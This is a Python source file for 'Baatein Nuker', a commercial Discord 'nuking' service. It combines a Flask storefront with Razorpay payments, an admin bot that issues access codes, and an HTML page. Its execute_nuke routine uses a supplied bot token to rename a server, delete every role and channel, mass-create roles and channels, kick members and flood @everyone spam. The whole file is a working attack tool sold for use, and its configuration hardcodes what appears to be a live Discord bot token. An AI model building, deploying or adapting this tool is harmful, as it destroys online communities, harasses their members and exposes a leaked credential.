from flask import Flask, request, jsonify
from flask_cors import CORS
import discord
from discord.ext import commands
import requests
import asyncio
import aiohttp
import threading
import os
import json
import random
import string
from datetime import datetime, timedelta

# ============= CONFIGURATION =============
DISCORD_BOT_TOKEN = "MTQxODk4MjUwOTQ0MTU4MTEyNg.GREs0N.RKwYJNsNl3lMP5K7vWlCNB8Wr0JswQ_0rSs86U"
AUTHORIZED_USERS = [1385360934058332240, 1113476092225912882]

# RAZORPAY CREDENTIALS (Replace with your actual keys)
RAZORPAY_KEY_ID = "rzp_test_YOUR_KEY_ID"
RAZORPAY_KEY_SECRET = "YOUR_KEY_SECRET"

WEBSITE_URL = "http://localhost:5000"
DISCORD_WEBHOOK_URL = ""

# Flask App
app = Flask(__name__)
CORS(app)

# Discord Bot with prefix
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# Code Manager
class CodeManager:
    def __init__(self):
        self.config_file = 'config.json'
        self.load_data()
    
    def load_data(self):
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                data = json.load(f)
                self.codes = data.get('codes', {})
                self.authorized_users = data.get('authorized_users', AUTHORIZED_USERS)
        else:
            self.codes = {}
            self.authorized_users = AUTHORIZED_USERS
            self.save_data()
    
    def save_data(self):
        current_time = datetime.now()
        codes_to_remove = []
        
        for code, data in self.codes.items():
            if data['expiry']:
                expiry_time = datetime.fromisoformat(data['expiry'])
                if expiry_time < current_time:
                    codes_to_remove.append(code)
                    continue
            
            if not data['unlimited'] and data['uses_left'] <= 0:
                codes_to_remove.append(code)
        
        for code in codes_to_remove:
            del self.codes[code]
        
        data = {'codes': self.codes, 'authorized_users': self.authorized_users}
        with open(self.config_file, 'w') as f:
            json.dump(data, f, indent=4)
    
    def generate_code(self, length=10):
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))
    
    def create_code(self, uses, expiry_delta=None, max_servers=1):
        code = self.generate_code()
        expiry = (datetime.now() + expiry_delta).isoformat() if expiry_delta else None
        
        self.codes[code] = {
            'uses_left': uses,
            'unlimited': uses == 0,
            'expiry': expiry,
            'created': datetime.now().isoformat(),
            'total_uses': 0,
            'max_servers': max_servers,
            'servers_nuked': []
        }
        self.save_data()
        return code
    
    def validate_code(self, code):
        self.load_data()
        if code not in self.codes:
            return False, "Invalid code"
        
        code_data = self.codes[code]
        if code_data['expiry']:
            if datetime.fromisoformat(code_data['expiry']) < datetime.now():
                del self.codes[code]
                self.save_data()
                return False, "Code expired"
        
        if not code_data['unlimited'] and code_data['uses_left'] <= 0:
            del self.codes[code]
            self.save_data()
            return False, "No uses left"
        
        return True, "Valid"
    
    def can_nuke_server(self, code, guild_id):
        if code not in self.codes:
            return False, "Invalid code"
        
        code_data = self.codes[code]
        if guild_id in code_data.get('servers_nuked', []):
            return False, "Server already nuked"
        
        if len(code_data.get('servers_nuked', [])) >= code_data.get('max_servers', 1):
            return False, f"Code limited to {code_data['max_servers']} server(s)"
        
        return True, "OK"
    
    def mark_server_nuked(self, code, guild_id):
        if code in self.codes:
            if 'servers_nuked' not in self.codes[code]:
                self.codes[code]['servers_nuked'] = []
            
            if guild_id not in self.codes[code]['servers_nuked']:
                self.codes[code]['servers_nuked'].append(guild_id)
                self.codes[code]['total_uses'] += 1
                
                if not self.codes[code]['unlimited']:
                    self.codes[code]['uses_left'] -= 1
                
                self.save_data()
                return True
        return False
    
    def add_authorized_user(self, user_id):
        if user_id not in self.authorized_users:
            self.authorized_users.append(user_id)
            self.save_data()
            return True
        return False
    
    def is_authorized(self, user_id):
        return user_id in self.authorized_users

code_manager = CodeManager()

# Bot Events
@bot.event
async def on_ready():
    print(f'[BOT] Logged in as {bot.user.name}')
    await bot.change_presence(status=discord.Status.online, activity=discord.Game(name="discord.gg/baatein"))
    
    try:
        await bot.http.request(
            discord.http.Route('PATCH', '/users/@me'),
            json={'bio': 'discord.gg/baatein'}
        )
        print('[BOT] Updated bio')
    except:
        pass

# Bot Commands
@bot.command(name='gen')
async def generate_code(ctx, uses: str, time: str):
    """Generate access code - Usage: !gen <uses> <time>"""
    if not code_manager.is_authorized(ctx.author.id):
        await ctx.send("❌ Not authorized!", delete_after=5)
        return
    
    try:
        use_count = 0 if uses.lower() == 'unlimited' else int(uses)
        time_lower = time.lower()
        expiry_delta = None
        
        if time_lower.endswith('m'):
            expiry_delta = timedelta(minutes=int(time_lower[:-1]))
        elif 'hr' in time_lower or time_lower.endswith('h'):
            expiry_delta = timedelta(hours=int(time_lower.replace('hr', '').replace('h', '')))
        elif 'day' in time_lower or time_lower.endswith('d'):
            expiry_delta = timedelta(days=int(time_lower.replace('day', '').replace('d', '')))
        elif 'month' in time_lower:
            expiry_delta = timedelta(days=int(time_lower.replace('month', '')) * 30)
        elif time_lower == 'never':
            expiry_delta = None
        else:
            await ctx.send("❌ Invalid time format! Use: 1m, 1hr, 1day, or never", delete_after=5)
            return
        
        code = code_manager.create_code(use_count, expiry_delta, 1)
        
        embed = discord.Embed(title="🔑 Code Generated", color=discord.Color.purple())
        embed.add_field(name="Code", value=f"```{code}```", inline=False)
        embed.add_field(name="Servers", value="1", inline=True)
        embed.add_field(name="Uses", value=f"{'Unlimited' if use_count == 0 else use_count}", inline=True)
        if expiry_delta:
            embed.add_field(name="Expires", value=f"<t:{int((datetime.now() + expiry_delta).timestamp())}:R>", inline=True)
        embed.set_footer(text=f"Baatein Nuker • {WEBSITE_URL}")
        
        await ctx.send(embed=embed, delete_after=60)
        
        # Delete the command message for privacy
        try:
            await ctx.message.delete()
        except:
            pass
            
    except ValueError:
        await ctx.send("❌ Invalid number format!", delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}", delete_after=5)

@bot.command(name='help')
async def help_command(ctx):
    """Show help information"""
    embed = discord.Embed(title="⚡ Baatein Nuker", color=discord.Color.purple())
    embed.add_field(name="🌐 Website", value=f"[Click Here]({WEBSITE_URL})", inline=False)
    embed.add_field(name="💰 Pricing", value="1 server, 5hr = ₹10\n+₹10 per server\n+₹5 per 5hr", inline=False)
    
    if code_manager.is_authorized(ctx.author.id):
        embed.add_field(
            name="Admin Commands", 
            value="• `!gen <uses> <time>` - Generate code\n• `!adduser <user_id>` - Add authorized user\n• `!help` - Show this message", 
            inline=False
        )
    
    embed.add_field(
        name="Features", 
        value="• Server name change\n• Delete/Create channels\n• Delete/Create roles\n• Mass messaging\n• Kick members", 
        inline=False
    )
    embed.set_footer(text="Use prefix: !")
    
    await ctx.send(embed=embed)

@bot.command(name='adduser')
async def add_user(ctx, userid: str):
    """Add authorized user - Usage: !adduser <user_id>"""
    if not code_manager.is_authorized(ctx.author.id):
        await ctx.send("❌ Not authorized!", delete_after=5)
        return
    
    try:
        user_id = int(userid)
        if code_manager.add_authorized_user(user_id):
            await ctx.send(f"✅ User {user_id} authorized!", delete_after=10)
        else:
            await ctx.send("⚠️ Already authorized!", delete_after=5)
        
        # Delete the command message for privacy
        try:
            await ctx.message.delete()
        except:
            pass
            
    except ValueError:
        await ctx.send("❌ Invalid user ID!", delete_after=5)

# Error handler
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing argument! Use `!help` for command usage.", delete_after=5)
    else:
        await ctx.send(f"❌ Error: {error}", delete_after=5)

# Discord API
class DiscordAPI:
    def __init__(self):
        self.base_url = "https://discord.com/api/v10"
    
    def get_bot_info(self, token):
        headers = {'Authorization': f'Bot {token}'}
        try:
            response = requests.get(f'{self.base_url}/users/@me', headers=headers)
            return response.json() if response.status_code == 200 else None
        except:
            return None
    
    def get_bot_servers(self, token):
        headers = {'Authorization': f'Bot {token}'}
        response = requests.get(f'{self.base_url}/users/@me/guilds', headers=headers)
        
        if response.status_code == 200:
            guilds = response.json()
            return [{
                'id': g['id'],
                'name': g['name'],
                'icon': f"https://cdn.discordapp.com/icons/{g['id']}/{g['icon']}.png" if g['icon'] else None,
                'hasAdmin': (int(g['permissions']) & 0x8) == 0x8
            } for g in guilds]
        raise Exception("Failed to fetch servers")

discord_api = DiscordAPI()

async def set_bot_online_async(token):
    try:
        headers = {'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
        requests.patch(f'{discord_api.base_url}/users/@me', headers=headers, json={'bio': 'discord.gg/baatein'})
        print("[TARGET BOT] ✅ Set online")
    except Exception as e:
        print(f"[TARGET BOT] Error: {e}")

def set_bot_online(token):
    asyncio.run(set_bot_online_async(token))

# HTML
HTML_CONTENT = open('index.html', 'r').read() if os.path.exists('index.html') else '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Baatein Nuker</title>
    <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Poppins', sans-serif; background: linear-gradient(135deg, #0f0f1e 0%, #1a1a2e 100%); color: #fff; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        header { text-align: center; margin-bottom: 40px; }
        .logo { font-size: 3rem; font-weight: 700; background: linear-gradient(135deg, #7c3aed 0%, #ec4899 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .card { background: rgba(26, 26, 46, 0.8); border-radius: 20px; padding: 30px; margin-bottom: 30px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); border: 1px solid rgba(124, 58, 237, 0.2); }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
        .tab { flex: 1; padding: 15px; background: rgba(15, 15, 30, 0.6); border: 2px solid rgba(124, 58, 237, 0.3); border-radius: 12px; cursor: pointer; text-align: center; font-weight: 600; transition: all 0.3s; }
        .tab.active { background: linear-gradient(135deg, #7c3aed, #ec4899); }
        input, select, textarea { width: 100%; padding: 15px; border-radius: 12px; border: 2px solid rgba(124, 58, 237, 0.3); background: rgba(15, 15, 30, 0.6); color: #fff; font-size: 1rem; margin-bottom: 15px; }
        button { width: 100%; background: linear-gradient(135deg, #7c3aed, #ec4899); color: #fff; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-size: 1rem; font-weight: 600; }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(124, 58, 237, 0.5); }
        .hidden { display: none !important; }
        .price { font-size: 2.5rem; font-weight: 700; color: #10b981; text-align: center; margin: 20px 0; }
        .server-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .server-card { background: rgba(15, 15, 30, 0.6); border-radius: 15px; padding: 20px; display: flex; align-items: center; cursor: pointer; border: 2px solid transparent; transition: all 0.3s; }
        .server-card:hover { border-color: #7c3aed; transform: translateY(-5px); }
        .server-card.selected { border-color: #10b981; background: rgba(16, 185, 129, 0.1); }
        .server-icon { width: 60px; height: 60px; border-radius: 50%; margin-right: 20px; background: linear-gradient(135deg, #7c3aed, #ec4899); display: flex; align-items: center; justify-content: center; font-size: 1.5rem; overflow: hidden; }
        .server-icon img { width: 100%; height: 100%; object-fit: cover; }
        .badge { padding: 4px 12px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; margin-left: 10px; }
        .badge-admin { background: #10b981; color: #000; }
        .badge-no-admin { background: #ef4444; color: #fff; }
        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 20px; }
        .loading { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
        .spinner { width: 60px; height: 60px; border: 4px solid rgba(124, 58, 237, 0.2); border-top: 4px solid #7c3aed; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        label { display: block; margin-bottom: 5px; color: #ec4899; font-weight: 600; }
    </style>
</head>
<body>
    <div id="loading" class="loading hidden">
        <div class="spinner"></div>
        <div style="margin-top: 20px; font-size: 1.2rem; color: #7c3aed;">Processing...</div>
    </div>
    
    <div class="container">
        <header>
            <h1 class="logo">⚡ Baatein Nuker</h1>
            <p style="color: #9ca3af; font-size: 1.2rem;">Ultimate Discord Server Management</p>
        </header>
        
        <div class="card">
            <div class="tabs">
                <div class="tab active" onclick="switchTab('buy')">💳 Buy Code</div>
                <div class="tab" onclick="switchTab('have')">🔑 Have Code</div>
            </div>
            
            <div id="buyTab">
                <h2 style="color: #7c3aed; margin-bottom: 20px;">Purchase Access Code</h2>
                <label>Servers</label>
                <input type="number" id="buyServers" value="1" min="1" max="10" onchange="updatePrice()">
                <label>Hours</label>
                <input type="number" id="buyHours" value="5" min="5" max="720" step="5" onchange="updatePrice()">
                <div class="price">₹<span id="price">10</span></div>
                <button onclick="buy()">Proceed to Payment</button>
            </div>
            
            <div id="haveTab" class="hidden">
                <h2 style="color: #7c3aed; margin-bottom: 20px;">Enter Code</h2>
                <input type="text" id="code" placeholder="10-digit code">
                <button onclick="verifyCode()">Verify</button>
            </div>
        </div>
        
        <div id="tokenSection" class="card hidden">
            <h2 style="color: #7c3aed; margin-bottom: 20px;">Bot Token</h2>
            <input type="text" id="token" placeholder="Your bot token">
            <button onclick="loadServers()">Load Servers</button>
        </div>
        
        <div id="serversSection" class="card hidden">
            <h2 style="color: #7c3aed; margin-bottom: 20px;">Select Server</h2>
            <div id="servers" class="server-grid"></div>
        </div>
        
        <div id="toolsSection" class="card hidden">
            <h2 style="color: #7c3aed; margin-bottom: 20px;">Nuke: <span id="serverName"></span></h2>
            <div class="tool-grid">
                <div><label>Message</label><textarea id="msg" rows="2">Nuked By Baatein 💀</textarea></div>
                <div><label>Count</label><input type="number" id="msgCount" value="20" min="1" max="100"></div>
                <div><label>Pings</label><input type="number" id="pings" value="3" min="0" max="10"></div>
                <div><label>New Channels</label><input type="number" id="channels" value="10" min="0" max="50"></div>
                <div><label>Channel Name</label><input type="text" id="channelName" value="nuked"></div>
                <div><label>New Roles</label><input type="number" id="roles" value="10" min="0" max="50"></div>
                <div><label>Role Name</label><input type="text" id="roleName" value="Nuked"></div>
                <div><label>Server Name</label><input type="text" id="newName" value="Nuked By Baatein"></div>
            </div>
            <div style="margin-bottom: 15px;">
                <label><input type="checkbox" id="delChannels" checked style="width: auto; margin-right: 10px;"> Delete Channels</label>
                <label><input type="checkbox" id="delRoles" checked style="width: auto; margin-right: 10px;"> Delete Roles</label>
                <label><input type="checkbox" id="kickMembers" style="width: auto; margin-right: 10px;"> Kick Members</label>
            </div>
            <button onclick="nuke()" style="background: linear-gradient(135deg, #ef4444, #dc2626);">🚀 EXECUTE NUKE</button>
        </div>
    </div>

    <script>
        let currentCode = '', currentToken = '', currentGuild = null;
        
        function show(id) { document.getElementById(id).classList.remove('hidden'); }
        function hide(id) { document.getElementById(id).classList.add('hidden'); }
        function showLoading() { show('loading'); }
        function hideLoading() { hide('loading'); }
        
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            if (tab === 'buy') {
                hide('haveTab'); show('buyTab');
                document.querySelectorAll('.tab')[0].classList.add('active');
            } else {
                hide('buyTab'); show('haveTab');
                document.querySelectorAll('.tab')[1].classList.add('active');
            }
        }
        
        function updatePrice() {
            const s = parseInt(document.getElementById('buyServers').value) || 1;
            const h = parseInt(document.getElementById('buyHours').value) || 5;
            const price = Math.round((s * 10) + ((h / 5) - 1) * 5);
            document.getElementById('price').textContent = price;
        }
        
        async function buy() {
            const s = parseInt(document.getElementById('buyServers').value);
            const h = parseInt(document.getElementById('buyHours').value);
            const p = parseInt(document.getElementById('price').textContent);
            
            showLoading();
            try {
                const res = await fetch('/api/create-order', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({servers: s, hours: h, price: p})
                });
                const data = await res.json();
                
                hideLoading();
                const options = {
                    key: data.razorpay_key,
                    amount: data.amount,
                    currency: 'INR',
                    name: 'Baatein Nuker',
                    order_id: data.order_id,
                    handler: async function(r) {
                        showLoading();
                        const vRes = await fetch('/api/verify-payment', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({...r, servers: s, hours: h})
                        });
                        const vData = await vRes.json();
                        hideLoading();
                        
                        if (vRes.ok) {
                            alert(`✅ Payment Success!\\n\\nCode: ${vData.code}`);
                            currentCode = vData.code;
                            switchTab('have');
                            document.getElementById('code').value = vData.code;
                        } else {
                            alert('Payment verification failed!');
                        }
                    },
                    theme: {color: '#7c3aed'}
                };
                new Razorpay(options).open();
            } catch(e) {
                hideLoading();
                alert('Payment failed!');
            }
        }
        
        async function verifyCode() {
            const code = document.getElementById('code').value.trim().toUpperCase();
            if (!code) return alert('Enter code');
            
            showLoading();
            try {
                const res = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({code})
                });
                
                if (res.ok) {
                    currentCode = code;
                    show('tokenSection');
                    hide('buyTab');
                    hide('haveTab');
                } else {
                    const data = await res.json();
                    alert(data.error);
                }
            } catch(e) {
                alert('Verification failed');
            }
            hideLoading();
        }
        
        async function loadServers() {
            const token = document.getElementById('token').value.trim();
            if (!token) return alert('Enter token');
            
            currentToken = token;
            showLoading();
            
            try {
                const res = await fetch('/api/servers', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({token})
                });
                const data = await res.json();
                
                if (res.ok) {
                    const grid = document.getElementById('servers');
                    grid.innerHTML = '';
                    data.servers.forEach(s => {
                        const card = document.createElement('div');
                        card.className = 'server-card';
                        if (!s.hasAdmin) {
                            card.style.opacity = '0.5';
                            card.style.cursor = 'not-allowed';
                        }
                        
                        card.innerHTML = `
                            <div class="server-icon">${s.icon ? `<img src="${s.icon}">` : s.name[0]}</div>
                            <div style="flex: 1;">
                                <div style="font-weight: 600;">
                                    ${s.name}
                                    <span class="badge ${s.hasAdmin ? 'badge-admin' : 'badge-no-admin'}">
                                        ${s.hasAdmin ? 'ADMIN' : 'NO ADMIN'}
                                    </span>
                                </div>
                            </div>
                        `;
                        
                        if (s.hasAdmin) {
                            card.onclick = () => {
                                currentGuild = s;
                                document.getElementById('serverName').textContent = s.name;
                                show('toolsSection');
                                document.querySelectorAll('.server-card').forEach(c => c.classList.remove('selected'));
                                card.classList.add('selected');
                            };
                        }
                        
                        grid.appendChild(card);
                    });
                    show('serversSection');
                } else {
                    alert(data.error);
                }
            } catch(e) {
                alert('Failed to load servers');
            }
            hideLoading();
        }
        
        async function nuke() {
            if (!currentGuild || !currentCode) return alert('Select server first');
            
            if (!confirm(`⚠️ NUKE ${currentGuild.name}?\\n\\nThis cannot be undone!`)) return;
            
            showLoading();
            
            const config = {
                code: currentCode,
                token: currentToken,
                guild_id: currentGuild.id,
                message: document.getElementById('msg').value,
                message_count: parseInt(document.getElementById('msgCount').value),
                ping_count: parseInt(document.getElementById('pings').value),
                new_channel_count: parseInt(document.getElementById('channels').value),
                channel_name: document.getElementById('channelName').value,
                new_role_count: parseInt(document.getElementById('roles').value),
                role_name: document.getElementById('roleName').value,
                server_name: document.getElementById('newName').value,
                delete_channels: document.getElementById('delChannels').checked,
                delete_roles: document.getElementById('delRoles').checked,
                kick_members: document.getElementById('kickMembers').checked
            };
            
            try {
                const res = await fetch('/api/nuke', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(config)
                });
                
                const data = await res.json();
                
                if (res.ok) {
                    setTimeout(() => {
                        hideLoading();
                        alert('✅ NUKE COMPLETED!');
                        location.reload();
                    }, 5000);
                } else {
                    hideLoading();
                    alert(data.error || 'Failed');
                }
            } catch(e) {
                hideLoading();
                alert('Error occurred');
            }
        }
        
        updatePrice();
    </script>
</body>
</html>
'''

# Flask Routes
@app.route('/')
def index():
    return HTML_CONTENT

@app.route('/api/create-order', methods=['POST'])
def create_order():
    data = request.json
    try:
        import razorpay
        client = razorpay.Client(auth=(RAZORPAY_KEY_ID, RAZORPAY_KEY_SECRET))
        order = client.order.create(data={
            'amount': data['price'] * 100,
            'currency': 'INR',
            'payment_capture': 1
        })
        return jsonify({'order_id': order['id'], 'amount': order['amount'], 'razorpay_key': RAZORPAY_KEY_ID})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/verify-payment', methods=['POST'])
def verify_payment():
    data = request.json
    try:
        import razorpay
        client = razorpay.Client(auth=(RAZORPAY_KEY_ID, RAZORPAY_KEY_SECRET))
        client.utility.verify_payment_signature({
            'razorpay_payment_id': data['razorpay_payment_id'],
            'razorpay_order_id': data['razorpay_order_id'],
            'razorpay_signature': data['razorpay_signature']
        })
        
        code = code_manager.create_code(
            data['servers'],
            timedelta(hours=data['hours']),
            data['servers']
        )
        
        if DISCORD_WEBHOOK_URL:
            try:
                requests.post(DISCORD_WEBHOOK_URL, json={
                    'embeds': [{
                        'title': '💰 Payment',
                        'description': f'Code: `{code}`\nServers: {data["servers"]}\nHours: {data["hours"]}',
                        'color': 7419530
                    }]
                })
            except:
                pass
        
        return jsonify({'success': True, 'code': code})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    code = request.json.get('code', '').strip().upper()
    valid, msg = code_manager.validate_code(code)
    return jsonify({'success': True}) if valid else (jsonify({'error': msg}), 403)

@app.route('/api/servers', methods=['POST'])
def get_servers():
    token = request.json.get('token')
    if not token:
        return jsonify({'error': 'Token required'}), 400
    
    try:
        servers = discord_api.get_bot_servers(token)
        threading.Thread(target=set_bot_online, args=(token,), daemon=True).start()
        return jsonify({'servers': servers})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/nuke', methods=['POST'])
def run_nuke():
    data = request.json
    code = data.get('code')
    guild_id = data.get('guild_id')
    
    can_nuke, msg = code_manager.can_nuke_server(code, guild_id)
    if not can_nuke:
        return jsonify({'error': msg}), 403
    
    code_manager.mark_server_nuked(code, guild_id)
    
    threading.Thread(target=lambda: asyncio.run(execute_nuke(data)), daemon=True).start()
    return jsonify({'status': 'Started'})

# Nuke Execution
async def execute_nuke(config):
    token = config['token']
    guild_id = config['guild_id']
    headers = {'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
    base = 'https://discord.com/api/v10'
    
    print(f"[NUKE] Starting on {guild_id}")
    
    try:
        async with aiohttp.ClientSession() as session:
            # 1. Change name
            try:
                async with session.patch(f'{base}/guilds/{guild_id}', headers=headers, json={'name': config['server_name']}) as r:
                    if r.status == 200:
                        print("[NUKE] ✅ Name changed")
            except:
                pass
            
            # 2. Delete roles
            if config.get('delete_roles'):
                print("[NUKE] Deleting roles...")
                try:
                    async with session.get(f'{base}/guilds/{guild_id}/roles', headers=headers) as r:
                        if r.status == 200:
                            roles = await r.json()
                            tasks = [delete_role(session, headers, guild_id, role['id']) for role in roles if role['name'] != '@everyone']
                            await asyncio.gather(*tasks, return_exceptions=True)
                except:
                    pass
            
            # 3. Create roles
            if config.get('new_role_count', 0) > 0:
                print(f"[NUKE] Creating {config['new_role_count']} roles...")
                tasks = [create_role(session, headers, guild_id, f"{config['role_name']}-{i+1}") for i in range(config['new_role_count'])]
                await asyncio.gather(*tasks, return_exceptions=True)
            
            # 4. Delete channels
            if config.get('delete_channels'):
                print("[NUKE] Deleting channels...")
                try:
                    async with session.get(f'{base}/guilds/{guild_id}/channels', headers=headers) as r:
                        if r.status == 200:
                            channels = await r.json()
                            tasks = [delete_channel(session, headers, c['id']) for c in channels]
                            await asyncio.gather(*tasks, return_exceptions=True)
                except:
                    pass
            
            # 5. Create channels
            created_channels = []
            if config.get('new_channel_count', 0) > 0:
                print(f"[NUKE] Creating {config['new_channel_count']} channels...")
                tasks = [create_channel(session, headers, guild_id, f"{config['channel_name']}-{i+1}") for i in range(config['new_channel_count'])]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                created_channels = [r for r in results if r and not isinstance(r, Exception)]
            
            if not created_channels:
                try:
                    async with session.get(f'{base}/guilds/{guild_id}/channels', headers=headers) as r:
                        if r.status == 200:
                            channels = await r.json()
                            created_channels = [c['id'] for c in channels if c['type'] == 0]
                except:
                    pass
            
            # 6. Kick members
            if config.get('kick_members'):
                print("[NUKE] Kicking members...")
                try:
                    async with session.get(f'{base}/guilds/{guild_id}/members?limit=1000', headers=headers) as r:
                        if r.status == 200:
                            members = await r.json()
                            tasks = [kick_member(session, headers, guild_id, m['user']['id']) for m in members if not m['user'].get('bot')]
                            await asyncio.gather(*tasks, return_exceptions=True)
                except:
                    pass
            
            # 7. Send messages
            if created_channels and config.get('message_count', 0) > 0:
                print(f"[NUKE] Sending messages...")
                message = config['message']
                if config.get('ping_count', 0) > 0:
                    message += ' @everyone' * config['ping_count']
                
                tasks = []
                for ch_id in created_channels:
                    for i in range(config['message_count']):
                        tasks.append(send_message(session, headers, ch_id, message))
                
                await asyncio.gather(*tasks, return_exceptions=True)
            
            print("[NUKE] ✅ COMPLETED!")
    except Exception as e:
        print(f"[NUKE] ❌ Error: {e}")

async def delete_role(session, headers, guild_id, role_id):
    try:
        async with session.delete(f'https://discord.com/api/v10/guilds/{guild_id}/roles/{role_id}', headers=headers) as r:
            if r.status == 204:
                print("[NUKE] ✅ Role deleted")
            await asyncio.sleep(0.2)
    except:
        pass

async def create_role(session, headers, guild_id, name):
    try:
        async with session.post(f'https://discord.com/api/v10/guilds/{guild_id}/roles', headers=headers, json={'name': name, 'color': 16711680}) as r:
            if r.status == 200:
                print("[NUKE] ✅ Role created")
                return (await r.json())['id']
            await asyncio.sleep(0.2)
    except:
        pass

async def delete_channel(session, headers, channel_id):
    try:
        async with session.delete(f'https://discord.com/api/v10/channels/{channel_id}', headers=headers) as r:
            if r.status in [200, 204]:
                print("[NUKE] ✅ Channel deleted")
            await asyncio.sleep(0.2)
    except:
        pass

async def create_channel(session, headers, guild_id, name):
    try:
        async with session.post(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers, json={'name': name, 'type': 0}) as r:
            if r.status == 201:
                data = await r.json()
                print("[NUKE] ✅ Channel created")
                return data['id']
            await asyncio.sleep(0.2)
    except:
        pass

async def kick_member(session, headers, guild_id, member_id):
    try:
        async with session.delete(f'https://discord.com/api/v10/guilds/{guild_id}/members/{member_id}', headers=headers) as r:
            if r.status == 204:
                print("[NUKE] ✅ Member kicked")
            await asyncio.sleep(0.3)
    except:
        pass

async def send_message(session, headers, channel_id, message):
    try:
        async with session.post(f'https://discord.com/api/v10/channels/{channel_id}/messages', headers=headers, json={'content': message}) as r:
            if r.status in [200, 201]:
                print("[NUKE] ✅ Message sent")
            await asyncio.sleep(0.3)
    except:
        pass

# Run
def run_flask():
    app.run(debug=False, port=5000, host='0.0.0.0', use_reloader=False)

def run_bot():
    bot.run(DISCORD_BOT_TOKEN)

if __name__ == '__main__':
    print("="*70)
    print("  ⚡ BAATEIN NUKER - COMPLETE SYSTEM")
    print("="*70)
    print("\n  🌐 Web: http://localhost:5000")
    print("  🤖 Bot: Connecting...")
    print("  💰 Payment: Razorpay")
    print("  📝 Commands: !gen !help !adduser")
    print("  🎯 Prefix: !")
    print("\n" + "="*70 + "\n")
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    try:
        run_bot()
    except KeyboardInterrupt:
        print("\n[SYSTEM] Shutting down...")
